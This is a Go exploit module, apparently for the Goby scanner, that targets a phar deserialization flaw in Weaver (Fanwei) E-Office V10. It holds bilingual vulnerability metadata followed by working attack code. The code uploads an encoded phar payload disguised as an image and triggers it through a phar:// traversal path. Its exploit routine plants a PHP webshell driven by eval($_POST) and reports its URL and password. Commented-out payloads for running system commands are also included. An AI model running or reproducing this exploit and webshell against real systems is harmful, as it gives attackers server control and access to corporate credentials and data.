package exploits

import (
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "E-OFFICE  phar deserialization vulnerability",
    "Description": "<p>Fanwei E-Office is a standardized collaborative OA office software. It implements generalized product design and fully meets the needs of enterprise management. Based on the principle of simplicity, ease of use, high efficiency and intelligence, it quickly creates mobile, paperless and digital for enterprises. office platform.</p><p>Fanwei E-OFFICEV10 uploads the malicious serialized data .inc file to the attachment/atuh-file interface, and then triggers phar deserialization to achieve the RCE operation when it finds the dingtalk/dingtalk-move deserialization trigger point. Fanwei E-OFFICEV10 full version RCE can directly obtain OA system server administrator privileges. Attackers can use this vulnerability to execute arbitrary system commands, obtain system database configuration account passwords, and obtain OA administrators and all user account passwords and employees by connecting to the database. Basic information, company organizational structure, entering the OA background, you can freely add and delete personnel accounts, view sensitive internal corporate documents, use these information and account identities to carry out harpoon attacks, steal corporate emails and documents; you can also obtain email configuration information configured by OA Or VPN configuration information, attackers can make secondary use, which will cause major security risks to the internal security of the enterprise.</p>",
    "Product": "Weaver-OA",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2023-1-3",
    "Author": "liuzhenqi@baimaohui.net",
    "FofaQuery": "body=\"/eoffice10/client/web/\" && body=\"eoffice_loading_tip\"",
    "GobyQuery": "body=\"/eoffice10/client/web/\" && body=\"eoffice_loading_tip\"",
    "Level": "3",
    "Impact": "<p>Fanwei E-Office is a standardized collaborative OA office software. It implements generalized product design and fully meets the needs of enterprise management. Based on the principle of simplicity, ease of use, high efficiency and intelligence, it quickly creates mobile, paperless and digital for enterprises. office platform.</p><p>Fanwei E-OFFICEV10 uploads the malicious serialized data .inc file to the attachment/atuh-file interface, and then triggers phar deserialization to achieve the RCE operation when it finds the dingtalk/dingtalk-move deserialization trigger point. Fanwei E-OFFICEV10 full version RCE can directly obtain OA system server administrator privileges. Attackers can use this vulnerability to execute arbitrary system commands, obtain system database configuration account passwords, and obtain OA administrators and all user account passwords and employees by connecting to the database. Basic information, company organizational structure, entering the OA background, you can freely add and delete personnel accounts, view sensitive internal corporate documents, use these information and account identities to carry out harpoon attacks, steal corporate emails and documents; you can also obtain email configuration information configured by OA Or VPN configuration information, attackers can make secondary use, which will cause major security risks to the internal security of the enterprise.</p>",
    "Recommendation": "<p>1. The official government has not fixed the vulnerability. Users are advised to contact the manufacturer to repair the vulnerability or follow the manufacturer's homepage at any time for a solution: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2. Set access policies and whitelist access on security devices such as firewalls.</p><p>3. Disable public networks from accessing the system if necessary.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "webshellurl"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.3",
    "Translation": {
        "CN": {
            "Name": "泛微E-OFFICEV10全版本phar反序列化漏洞",
            "Product": "泛微-协同办公OA",
            "Description": "<p>泛微 E-Office 是一款标准化的协同 OA 办公软件，实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。</p><p>泛微E-OFFICEV10通过向attachment/atuh-file接口上传恶意序列化数据.inc文件，之后在找到dingtalk/dingtalk-move反序列化触发点触发 phar 反序列化达到RCE操作。泛微E-OFFICEV10全版本RCE可直接获取OA系统服务器管理员权限，攻击者可利用该漏洞执行任意系统命令、获取系统数据库配置账号密码，并通过连接数据库获取OA管理员及所有用户账号密码、员工基本信息、公司组织架构，进入OA后台可自由添加删除人员账户、查看企业内部敏感文档，利用这些信息和账户身份进行鱼叉攻击、窃取企业机邮件和文档；还可以获取OA配置的邮件配置信息或VPN配置信息，攻击者可进行二次利用，会对企业内部安全造成重大安全隐患。</p>",
            "Recommendation": "<p>1、官方未修复该漏洞，建议用户联系厂商修复漏洞或随时关注厂商主页以获取解决办法：<a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>泛微 E-Office 是一款标准化的协同 OA 办公软件，实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。</p><p>泛微E-OFFICEV10通过向attachment/atuh-file接口上传恶意序列化数据.inc文件，之后在找到dingtalk/dingtalk-move反序列化触发点触发 phar 反序列化达到RCE操作。泛微E-OFFICEV10全版本RCE可直接获取OA系统服务器管理员权限，攻击者可利用该漏洞执行任意系统命令、获取系统数据库配置账号密码，并通过连接数据库获取OA管理员及所有用户账号密码、员工基本信息、公司组织架构，进入OA后台可自由添加删除人员账户、查看企业内部敏感文档，利用这些信息和账户身份进行鱼叉攻击、窃取企业机邮件和文档；还可以获取OA配置的邮件配置信息或VPN配置信息，攻击者可进行二次利用，会对企业内部安全造成重大安全隐患。</p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "E-OFFICE  phar deserialization vulnerability",
            "Product": "Weaver-OA",
            "Description": "<p>Fanwei E-Office is a standardized collaborative OA office software. It implements generalized product design and fully meets the needs of enterprise management. Based on the principle of simplicity, ease of use, high efficiency and intelligence, it quickly creates mobile, paperless and digital for enterprises. office platform.</p><p>Fanwei E-OFFICEV10 uploads the malicious serialized data .inc file to the attachment/atuh-file interface, and then triggers phar deserialization to achieve the RCE operation when it finds the dingtalk/dingtalk-move deserialization trigger point. Fanwei E-OFFICEV10 full version RCE can directly obtain OA system server administrator privileges. Attackers can use this vulnerability to execute arbitrary system commands, obtain system database configuration account passwords, and obtain OA administrators and all user account passwords and employees by connecting to the database. Basic information, company organizational structure, entering the OA background, you can freely add and delete personnel accounts, view sensitive internal corporate documents, use these information and account identities to carry out harpoon attacks, steal corporate emails and documents; you can also obtain email configuration information configured by OA Or VPN configuration information, attackers can make secondary use, which will cause major security risks to the internal security of the enterprise.</p>",
            "Recommendation": "<p>1. The official government has not fixed the vulnerability. Users are advised to contact the manufacturer to repair the vulnerability or follow the manufacturer's homepage at any time for a solution: <a href=\"https://www.weaver.com.cn/\">https://www.weaver.com.cn/</a></p><p>2. Set access policies and whitelist access on security devices such as firewalls.</p><p>3. Disable public networks from accessing the system if necessary.</p>",
            "Impact": "<p>Fanwei E-Office is a standardized collaborative OA office software. It implements generalized product design and fully meets the needs of enterprise management. Based on the principle of simplicity, ease of use, high efficiency and intelligence, it quickly creates mobile, paperless and digital for enterprises. office platform.</p><p>Fanwei E-OFFICEV10 uploads the malicious serialized data .inc file to the attachment/atuh-file interface, and then triggers phar deserialization to achieve the RCE operation when it finds the dingtalk/dingtalk-move deserialization trigger point. Fanwei E-OFFICEV10 full version RCE can directly obtain OA system server administrator privileges. Attackers can use this vulnerability to execute arbitrary system commands, obtain system database configuration account passwords, and obtain OA administrators and all user account passwords and employees by connecting to the database. Basic information, company organizational structure, entering the OA background, you can freely add and delete personnel accounts, view sensitive internal corporate documents, use these information and account identities to carry out harpoon attacks, steal corporate emails and documents; you can also obtain email configuration information configured by OA Or VPN configuration information, attackers can make secondary use, which will cause major security risks to the internal security of the enterprise.</p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10968"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			var exploit_0200 = func(u *httpclient.FixUrl, webshellbase64 string) string {
				webshell, err := base64.StdEncoding.DecodeString(webshellbase64)
				if err != nil {
					fmt.Println("error:", err)
				}
				cfg := httpclient.NewPostRequestConfig("/eoffice10/server/public/api/attachment/atuh-file")
				cfg.Header.Store("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36")
				cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
				cfg.Header.Store("Accept-Encoding", "gzip, deflate")
				cfg.Header.Store("Content-Type", "multipart/form-data; boundary=60b5fadd27756e7b36397823b1e2beb2")
				cfg.Data = "--60b5fadd27756e7b36397823b1e2beb2\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"register.inc\"\nContent-Type: image/jpeg\n\n" + string(webshell) + "\n--60b5fadd27756e7b36397823b1e2beb2--\n"
				var fileid string
				if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
					if len(regexp.MustCompile("attachment_id\":\"(.*)\",\"attachment_name").FindStringSubmatch(resp.Utf8Html)) > 0 {
						fileid = regexp.MustCompile("attachment_id\":\"(.*)\",\"attachment_name").FindStringSubmatch(resp.Utf8Html)[1]
					}
				}

				cfg2 := httpclient.NewPostRequestConfig("/eoffice10/server/public/api/wps/v1/3rd/file/history")
				cfg2.Header.Store("x-weboffice-file-id", fileid)
				var create_time string
				if resp, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					if len(regexp.MustCompile("create_time\":(.*),\"modify_time").FindStringSubmatch(resp.Utf8Html)) > 0 {
						create_time = regexp.MustCompile("create_time\":(.*),\"modify_time").FindStringSubmatch(resp.Utf8Html)[1]
					}
				}
				md5hash := md5.New()
				md5hash.Write([]byte(create_time + "register.inc"))
				// 获取文件修改时间生成 md5
				filename := hex.EncodeToString(md5hash.Sum(nil))

				year := time.Now().Format("2006")
				month := time.Now().Format("01")
				day := time.Now().Format("02")
				cfg3url := fmt.Sprintf("/eoffice10/server/public/api/dingtalk/dingtalk-move?imgs=phar://../../../../attachment/%s/%s/%s/%s/%s.inc", year, month, day, fileid, filename)
				cfg3 := httpclient.NewPostRequestConfig(cfg3url)
				if resp, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
					return resp.Utf8Html
				}
				return ""
			}
			// phpinfo 用于验证漏洞
			// data=base64.b64decode("PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQp6AAAAAQAAABEAAAABAAAAAABEAAAATzoyNjoiR3V6emxlSHR0cFxTdHJlYW1cRm5TdHJlYW0iOjE6e3M6OToiX2ZuX2Nsb3NlIjtzOjc6InBocGluZm8iO30IAAAAdGVzdC50eHQFAAAABRimYQUAAADpj7G7tAEAAAAAAAB0ZXNhdHYNx89IRBzrMMVBEab2F2dS7RsFAgAAAEdCTUI=")
			// system
			// data=base64.b64decode("PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQokAQAAAQAAABEAAAABAAAAAADuAAAATzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjE6e3M6MTY6IgAqAHF1ZXVlUmVzb2x2ZXIiO3M6Njoic3lzdGVtIjt9czo4OiIAKgBldmVudCI7TzozODoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcQnJvYWRjYXN0RXZlbnQiOjE6e3M6MTA6ImNvbm5lY3Rpb24iO3M6Njoid2hvYW1pIjt9fQgAAAB0ZXN0LnR4dAUAAAAqH6ZhBQAAAOmPsbu0AQAAAAAAAHRlc2F05eRmN0jjnqjxPuyQ7MEQ33p3j+QCAAAAR0JNQg==")
			// 写 shell。http://xxxx/depy3doc.php 密码 depy
			// data=base64.b64decode("PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpGAgAAAQAAABEAAAABAAAAAAAQAgAATzoyNjoiR3V6emxlSHR0cFxTdHJlYW1cRm5TdHJlYW0iOjE6e3M6OToiX2ZuX2Nsb3NlIjthOjI6e2k6MDtPOjM4OiJBcHBcQ29uc29sZVxDb21tYW5kc1xFb2ZmaWNlQ2FzZVVwZGF0ZSI6Mjp7czo5OiIAKgB1cGRhdGUiO086MjI6IkFwcFxVdGlsc1xDcmVhdGVBcGlEb2MiOjQ6e3M6Mjg6IgBBcHBcVXRpbHNcQ3JlYXRlQXBpRG9jAGN0cmwiO3M6MjI6IiBldmFsKCRfUE9TVFtkZXB5XSk7Pz4iO3M6MzM6IgBBcHBcVXRpbHNcQ3JlYXRlQXBpRG9jAGFwaURvY0RpciI7czoxOiIuIjtzOjM3OiIAQXBwXFV0aWxzXENyZWF0ZUFwaURvYwBhcGlEb2NEYXRlRGlyIjtzOjEwOiIuL3d3dy9kZXB5IjtzOjY6Im91dERpciI7czozOiIxMjMiO31zOjg6IgAqAGlucHV0IjtPOjI1OiJQcmVkaXNcQ29tbWFuZFxSYXdDb21tYW5kIjoxOntzOjM2OiIAUHJlZGlzXENvbW1hbmRcUmF3Q29tbWFuZABhcmd1bWVudHMiO2E6Mjp7czo3OiJ2ZXJzaW9uIjtzOjE6IjMiO3M6NzoiY2FzZV9pZCI7czoxOiIzIjt9fX1pOjE7czo2OiJoYW5kbGUiO319CAAAAHRlc3QudHh0BQAAAF8Dp2EFAAAA6Y+xu6QBAAAAAAAAdGVzYXQ9m+5g+9IwgmLVO4LRvIz526uSOAIAAABHQk1C");

			webshellbase64 := "PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQp6AAAAAQAAABEAAAABAAAAAABEAAAATzoyNjoiR3V6emxlSHR0cFxTdHJlYW1cRm5TdHJlYW0iOjE6e3M6OToiX2ZuX2Nsb3NlIjtzOjc6InBocGluZm8iO30IAAAAdGVzdC50eHQFAAAABRimYQUAAADpj7G7tAEAAAAAAAB0ZXNhdHYNx89IRBzrMMVBEab2F2dS7RsFAgAAAEdCTUI="
			if strings.Contains(exploit_0200(u, webshellbase64), "PHP Version") {
				return true
			}

			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var exploit_0200 = func(u *httpclient.FixUrl, webshellbase64 string) string {
				webshell, err := base64.StdEncoding.DecodeString(webshellbase64)
				if err != nil {
					fmt.Println("error:", err)
				}
				cfg := httpclient.NewPostRequestConfig("/eoffice10/server/public/api/attachment/atuh-file")
				cfg.Header.Store("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36")
				cfg.Header.Store("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
				cfg.Header.Store("Accept-Encoding", "gzip, deflate")
				cfg.Header.Store("Content-Type", "multipart/form-data; boundary=60b5fadd27756e7b36397823b1e2beb2")
				cfg.Data = "--60b5fadd27756e7b36397823b1e2beb2\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"register.inc\"\nContent-Type: image/jpeg\n\n" + string(webshell) + "\n--60b5fadd27756e7b36397823b1e2beb2--\n"
				var fileid string
				if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
					if len(regexp.MustCompile("attachment_id\":\"(.*)\",\"attachment_name").FindStringSubmatch(resp.Utf8Html)) > 0 {
						fileid = regexp.MustCompile("attachment_id\":\"(.*)\",\"attachment_name").FindStringSubmatch(resp.Utf8Html)[1]
					}
				}

				cfg2 := httpclient.NewPostRequestConfig("/eoffice10/server/public/api/wps/v1/3rd/file/history")
				cfg2.Header.Store("x-weboffice-file-id", fileid)
				var create_time string
				if resp, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
					if len(regexp.MustCompile("create_time\":(.*),\"modify_time").FindStringSubmatch(resp.Utf8Html)) > 0 {
						create_time = regexp.MustCompile("create_time\":(.*),\"modify_time").FindStringSubmatch(resp.Utf8Html)[1]
					}
				}
				md5hash := md5.New()
				md5hash.Write([]byte(create_time + "register.inc"))
				// 获取文件修改时间生成 md5
				filename := hex.EncodeToString(md5hash.Sum(nil))

				year := time.Now().Format("2006")
				month := time.Now().Format("01")
				day := time.Now().Format("02")
				cfg3url := fmt.Sprintf("/eoffice10/server/public/api/dingtalk/dingtalk-move?imgs=phar://../../../../attachment/%s/%s/%s/%s/%s.inc", year, month, day, fileid, filename)
				cfg3 := httpclient.NewPostRequestConfig(cfg3url)
				if resp, err := httpclient.DoHttpRequest(u, cfg3); err == nil {
					return resp.Utf8Html
				}
				return ""
			}
			//checkStr := goutils.RandomHexString(4)
			webshellbase64 := "PD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQpGAgAAAQAAABEAAAABAAAAAAAQAgAATzoyNjoiR3V6emxlSHR0cFxTdHJlYW1cRm5TdHJlYW0iOjE6e3M6OToiX2ZuX2Nsb3NlIjthOjI6e2k6MDtPOjM4OiJBcHBcQ29uc29sZVxDb21tYW5kc1xFb2ZmaWNlQ2FzZVVwZGF0ZSI6Mjp7czo5OiIAKgB1cGRhdGUiO086MjI6IkFwcFxVdGlsc1xDcmVhdGVBcGlEb2MiOjQ6e3M6Mjg6IgBBcHBcVXRpbHNcQ3JlYXRlQXBpRG9jAGN0cmwiO3M6MjI6IiBldmFsKCRfUE9TVFtkZXB5XSk7Pz4iO3M6MzM6IgBBcHBcVXRpbHNcQ3JlYXRlQXBpRG9jAGFwaURvY0RpciI7czoxOiIuIjtzOjM3OiIAQXBwXFV0aWxzXENyZWF0ZUFwaURvYwBhcGlEb2NEYXRlRGlyIjtzOjEwOiIuL3d3dy9kZXB5IjtzOjY6Im91dERpciI7czozOiIxMjMiO31zOjg6IgAqAGlucHV0IjtPOjI1OiJQcmVkaXNcQ29tbWFuZFxSYXdDb21tYW5kIjoxOntzOjM2OiIAUHJlZGlzXENvbW1hbmRcUmF3Q29tbWFuZABhcmd1bWVudHMiO2E6Mjp7czo3OiJ2ZXJzaW9uIjtzOjE6IjMiO3M6NzoiY2FzZV9pZCI7czoxOiIzIjt9fX1pOjE7czo2OiJoYW5kbGUiO319CAAAAHRlc3QudHh0BQAAAF8Dp2EFAAAA6Y+xu6QBAAAAAAAAdGVzYXQ9m+5g+9IwgmLVO4LRvIz526uSOAIAAABHQk1C"

			//webshell,err:=base64.StdEncoding.DecodeString(webshellbase64)
			//if err != nil {
			//	fmt.Println("error:", err)
			//}
			//webshellbase64_2:=base64.StdEncoding.EncodeToString([]byte(strings.Replace(string(webshell),"depy",checkStr,-1)))
			exploit_0200(expResult.HostInfo, webshellbase64)
			expResult.Output = "webshell: " + expResult.HostInfo.FixedHostInfo + "/depy3doc.php\n"
			expResult.Output += "password：depy\n"

			expResult.Success = true
			return expResult
		},
	))
}
